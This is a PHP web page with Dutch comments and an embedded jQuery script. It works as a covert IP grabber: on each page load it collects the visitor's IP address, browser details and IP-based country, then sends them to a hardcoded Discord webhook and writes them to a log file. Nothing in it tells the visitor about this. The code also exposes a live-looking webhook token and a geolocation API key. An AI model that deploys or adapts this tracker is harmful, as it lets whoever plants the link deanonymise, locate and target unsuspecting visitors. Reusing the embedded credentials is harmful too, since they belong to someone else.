<?php

require_once __DIR__ . '/vendor/autoload.php';

use UAParser\Parser;

// Functie om de IP-adresinformatie te verkrijgen
function getIPAddress() {
  // Controleer op shared internet (proxy) of dedicated server
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}

// Functie om Discord-gebruikersinformatie te verkrijgen (vereist Discord API)
function getDiscordInfo() {
  // Plaats hier je code om Discord-gegevens op te halen, bijv. via de Discord API
  // Je hebt een geldige Discord API-sleutel en de juiste toegangstokens nodig om dit te doen
  // Voeg de vereiste code toe om de Discord-gegevens op te halen en retourneer deze als een array
  $discordInfo = [
    'name' => 'Gebruikersnaam',
    'id' => '1234567890',
    // Voeg andere relevante Discord-informatie toe
  ];
  return $discordInfo;
}

// Functie om de browserinformatie te verkrijgen
function getBrowserInfo() {
  $userAgent = $_SERVER['HTTP_USER_AGENT'];

  $parser = Parser::create();
  $result = $parser->parse($userAgent);
  $browserInfo = $result->ua->family . ' ' . $result->ua->major . '.' . $result->ua->minor;

  return $browserInfo;
}

// Webhook URL
$webhookURL = 'https://discord.com/api/webhooks/1119964253462478958/hQUZXd5Ukkq2D2Swv78ZIiDIOc5hwIS5ICK7f7-Uo8RZgT1tw4CNXrn3OIaXr07vAxVt';

// Verzamel de benodigde informatie
$ipAddress = getIPAddress();
$discordInfo = getDiscordInfo();
$browserInfo = getBrowserInfo();

// Maak het bericht voor de Discord-webhook
$message = "IP-adres: $ipAddress\n";
$message .= "Discord-gebruikersnaam: {$discordInfo['name']}\n";
$message .= "Discord-ID: {$discordInfo['id']}\n";
$message .= "Browserinformatie: $browserInfo";

// Stuur het bericht naar de Discord-webhook met behulp van cURL
$ch = curl_init($webhookURL);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['content' => $message]));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

// Schrijf het bericht naar een logbestand
$logFile = 'log.txt';
$logMessage = "[" . date('Y-m-d H:i:s') . "] $message\n";
file_put_contents($logFile, $logMessage, FILE_APPEND | LOCK_EX);

// Testbericht om logfunctionaliteit afzonderlijk te controleren
$filePutContentsResult = file_put_contents($logFile, "Dit is een testbericht voor de logfunctionaliteit.\n", FILE_APPEND | LOCK_EX);
if ($filePutContentsResult !== false) {
    echo "Het testbericht is succesvol naar het logbestand geschreven.";
} else {
    echo "Er is een fout opgetreden bij het schrijven van het testbericht naar het logbestand.";
}
?>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(document).ready(function() {
    $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=c1331f86c8984dc89bf42ebf34f04404", function(data) {
        // Verzamel de gegevens van de API
        var ipAddress = data.ip_address;
        var country = data.country;

        // Stuur de gegevens naar de Discord-webhook met behulp van AJAX
        $.ajax({
            type: "POST",
            url: "<?php echo $webhookURL; ?>",
            data: {
                content: "IP-adres: " + ipAddress + "\nLand: " + country
            },
            success: function(response) {
                console.log("Gegevens succesvol naar Discord-webhook gestuurd.");
            },
            error: function(xhr, status, error) {
                console.log("Er is een fout opgetreden bij het verzenden van de gegevens naar de Discord-webhook.");
            }
        });
    });
});
</script>
